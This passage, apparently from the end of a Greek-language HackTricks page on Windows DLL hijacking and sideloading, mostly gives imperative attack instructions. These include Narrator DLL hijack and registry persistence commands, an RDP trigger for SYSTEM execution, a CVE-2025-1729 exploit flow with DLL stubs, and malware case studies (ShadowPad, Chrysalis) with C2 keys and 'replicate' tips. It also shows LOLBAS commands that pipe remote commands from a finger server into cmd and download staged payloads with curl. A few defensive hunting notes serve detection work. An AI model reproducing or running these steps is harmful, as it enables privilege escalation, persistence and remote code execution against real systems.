- Ένα naive hijack θα μιλήσει/θα επισημάνει το UI. Για να μείνεις αθόρυβος, στο attach κάνε enumerate τα Narrator threads, άνοιξε το main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάνε `SuspendThread` σε αυτό· συνέχισε στο δικό σου thread. Δες το PoC για πλήρη code.

Trigger και persistence μέσω Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (logon screen), πάτησε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator· το DLL σου εκτελείται ως SYSTEM στο secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Επίτρεψε classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Κάνε RDP στον host, στο logon screen πάτησε CTRL+WIN+ENTER για να εκκινήσεις τον Narrator· το DLL σου εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session—κάνε inject/migrate γρήγορα.

Bring Your Own Accessibility (BYOA)
- Μπορείς να αντιγράψεις ένα built-in Accessibility Tool (AT) registry entry (π.χ. CursorIndicator), να το επεξεργαστείς ώστε να δείχνει σε ένα arbitrary binary/DLL, να το importάρεις, και μετά να θέσεις το `configuration` σε αυτό το όνομα AT. Αυτό κάνει proxy arbitrary execution μέσα από το Accessibility framework.

Notes
- Η εγγραφή κάτω από `%windir%\System32` και η αλλαγή των HKLM values απαιτούν admin rights.
- Όλη η payload logic μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτό το case δείχνει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), με παρακολούθηση ως **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` τρέχει καθημερινά στις 9:30 AM υπό το context του logged-on user.
- **Directory Permissions**: Είναι writable από `CREATOR OWNER`, επιτρέποντας σε local users να ρίχνουν arbitrary files.
- **DLL Search Behavior**: Προσπαθεί να φορτώσει το `hostfxr.dll` από το working directory του πρώτα και καταγράφει "NAME NOT FOUND" αν λείπει, κάτι που δείχνει προτεραιότητα στο local directory search.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο φάκελο, εκμεταλλευόμενος το missing DLL για να πετύχει code execution υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Ως standard user, κάνε drop το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περίμενε να εκτελεστεί το scheduled task στις 9:30 AM υπό το context του τρέχοντος χρήστη.
3. Αν υπάρχει administrator logged in όταν εκτελεστεί το task, το malicious DLL τρέχει στο session του administrator με medium integrity.
4. Σύνδεσε standard UAC bypass techniques για να ανέβεις από medium integrity σε SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό ένα trusted, signed process.

Chain overview
- Ο χρήστης κατεβάζει MSI. Ένα CustomAction εκτελείται αθόρυβα κατά τη διάρκεια του GUI install (π.χ. LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο stage από embedded resources.
- Το dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν ξεκινά το signed EXE, το Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code υπό ένα signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication εκτελεί ένα embedded file in background.
- Στο Orca (Microsoft Orca.exe), inspect τα CustomAction, InstallExecuteSequence και Binary tables.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Ρίξε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμο signed host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με βάση το όνομά του από τον κατάλογό του.
- wsc.dll: attacker DLL. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί· διαφορετικά, build a proxy DLL και forward τα required exports στη genuine library ενώ τρέχεις payload στο DllMain.
- Build a minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για export requirements, use a proxying framework (e.g., DLLirant/Spartacus) to generate a forwarding DLL that also executes your payload.

- Αυτή η technique βασίζεται στη DLL name resolution από το host binary. Αν το host χρησιμοποιεί absolute paths ή safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS, και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Το Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας ένα **three-file triad** για να ταιριάξει με legitimate software, διατηρώντας παράλληλα το core payload encrypted στο disk:

1. **Signed host EXE** – vendor όπως AMD, Realtek, ή NVIDIA abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά η Authenticode signature παραμένει valid.
2. **Malicious loader DLL** – dropped δίπλα στο EXE με αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μόνος της ρόλος είναι να εντοπίσει το encrypted blob, να το decrypt, και να κάνει reflectively map το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο directory. Αφού memory-map το decrypted payload, ο loader διαγράφει το TMP file για να καταστρέψει forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (διατηρώντας όμως το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να masquerade ως Windows binary αλλά να κρατά το vendor signature, οπότε replicate τη συνήθεια του Ink Dragon να αφήνει binaries που μοιάζουν με `conhost.exe` αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζονται μόνο το malicious DLL να βρίσκεται δίπλα του. Εστίασε στην προσαρμογή του loader DLL· το signed parent μπορεί συνήθως να εκτελεστεί χωρίς αλλαγές.
* Ο ShadowPad decryptor περιμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable ώστε να μπορεί να μηδενίσει το file μετά το mapping. Κράτα το directory writable μέχρι να φορτώσει το payload· μόλις βρεθεί στη μνήμη, το TMP file μπορεί με ασφάλεια να διαγραφεί για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Οι operators συνδυάζουν DLL sideloading με LOLBAS ώστε το μόνο custom artifact στο disk να είναι το malicious DLL δίπλα στο trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pulls TCP/79 text; `| cmd` εκτελεί το response του server, επιτρέποντας στους operators να αλλάζουν το second stage server-side.

- **Built-in download/extract:** Download an archive με benign extension, unpack it, and stage the sideload target plus DLL under a random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` κρύβει την πρόοδο και ακολουθεί redirects; `tar -xf` χρησιμοποιεί το Windows' built-in tar.

- **WMI/CIM launch:** Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Works with binaries that prefer local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) runs under the trusted name.

- **Hunting:** Alert on `forfiles` when `/p`, `/m`, and `/c` appear together; uncommon outside admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom abused ένα trusted update chain για να deliver ένα NSIS-packed dropper που staged ένα DLL sideload μαζί με fully in-memory payloads.

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί `%AppData%\Bluetooth`, το μαρκάρει ως **HIDDEN**, drops ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll`, και ένα encrypted blob `BluetoothService`, και μετά launches το EXE.
- Το host EXE imports `log.dll` και καλεί `LogInit`/`LogWrite`. Το `LogInit` mmap-loads το blob· το `LogWrite` το decrypts με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived από ένα prior hash), overwrites the buffer με plaintext shellcode, frees temps, και jumps σε αυτό.
- Για να αποφύγει ένα IAT, ο loader resolves APIs κάνοντας hashing export names με **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, και μετά εφαρμόζει ένα Murmur-style avalanche (**0x85EBCA6B**) και συγκρίνει με salted target hashes.

Main shellcode (Chrysalis)
- Decrypts ένα PE-like main module επαναλαμβάνοντας add/XOR/sub με key `gQ2JR&9;` σε πέντε passes, και μετά dynamically loads `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει το import resolution.
- Reconstructs DLL name strings στο runtime μέσω per-character bit-rotate/XOR transforms, και μετά φορτώνει `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν second resolver που περπατά το **PEB → InMemoryOrderModuleList**, parse κάθε export table σε 4-byte blocks με Murmur-style mixing, και only falls back to `GetProcAddress` αν το hash δεν βρεθεί.

Embedded configuration & C2
- Το config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και decrypts με RC4 key `qwhvb^435h&*7`, revealing the C2 URL και User-Agent.
- Τα beacons χτίζουν ένα dot-delimited host profile, prepend tag `4Q`, then RC4-encrypt with key `vAuig34%^325hGV` before `HttpSendRequestA` over HTTPS. Τα responses RC4-decrypted και dispatched by a tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode is gated by CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i` relaunches self with `-k`; `-k` skips install and runs payload.

Alternate loader observed
- Η ίδια intrusion dropped Tiny C Compiler και executed `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με `libtcc.dll` δίπλα του. Το attacker-supplied C source embedded shellcode, compiled, και ran in-memory χωρίς να αγγίξει το disk με ένα PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το compile-and-run στάδιο βασισμένο σε TCC εισήγαγε `Wininet.dll` στο runtime και τράβηξε ένα second-stage shellcode από ένα hardcoded URL, δίνοντας έναν ευέλικτο loader που masquerades ως compiler run.

## Signed-host sideloading with export proxying + host thread parking

Ορισμένες DLL sideloading chains προσθέτουν **stability engineering** ώστε το νόμιμο host να παραμένει alive αρκετά ώστε να φορτώσει καθαρά τα επόμενα stages αντί να κρασάρει αφού φορτωθεί το malicious DLL.

Observed pattern
- Drop ένα trusted EXE δίπλα σε ένα malicious DLL χρησιμοποιώντας το αναμενόμενο dependency name, όπως `version.dll`.
- Το malicious DLL **proxies every expected export** πίσω στο πραγματικό system DLL (για παράδειγμα `%SystemRoot%\\System32\\version.dll`) ώστε η import resolution να συνεχίζει να πετυχαίνει και το host process να λειτουργεί.
- Μετά το load, το malicious DLL **patches το host entry point** ώστε το main thread να πέσει σε ένα infinite `Sleep` loop αντί να κάνει exit ή να εκτελέσει code paths που θα τερμάτιζαν το process.
- Ένα νέο thread εκτελεί το πραγματικό malicious work: decrypting το next-stage DLL name ή path (RC4/XOR είναι συνηθισμένα), και μετά το launch με `LoadLibrary`.

Why this matters
- Το normal DLL proxying διατηρεί την API compatibility, αλλά δεν εγγυάται ότι το host θα μείνει alive αρκετά για τα later stages.
- Το parking του main thread σε `Sleep(INFINITE)` είναι ένας απλός τρόπος να κρατήσεις το signed process resident ενώ ο loader κάνει decryption, staging, ή network bootstrap σε worker thread.
- Η αναζήτηση μόνο για ένα ύποπτο `DllMain` θα χάσει αυτό το pattern αν η ενδιαφέρουσα συμπεριφορά συμβαίνει αφού γίνει patch το host entry point και ξεκινήσει ένα δευτερεύον thread.

Minimal workflow
1. Αντέγραψε το signed host EXE και προσδιόρισε το DLL που resolve-άρει από τον local directory.
2. Φτιάξε ένα proxy DLL που export-άρει τις ίδιες functions και forward-άρει τες στο legitimate DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιούργησε ένα worker thread.
4. Από εκείνο το thread, κάνε patch το host entry point ή τη main thread start routine ώστε να κάνει loop στο `Sleep`.
5. Decrypt το next-stage DLL name/config και κάλεσε `LoadLibrary` ή manual-map το payload.

Defensive pivots
- Signed processes που φορτώνουν `version.dll` ή παρόμοια common libraries από το δικό τους application directory αντί από το `System32`.
- Memory patches στο process entry point λίγο μετά το image load, ειδικά jumps/calls που κατευθύνονται σε `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από ένα proxy DLL και αμέσως καλούν `LoadLibrary` σε ένα δεύτερο DLL με decrypted name.
- Full-export proxy DLLs τοποθετημένα δίπλα σε vendor executables μέσα σε writable staging directories όπως `ProgramData`, `%TEMP%`, ή unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
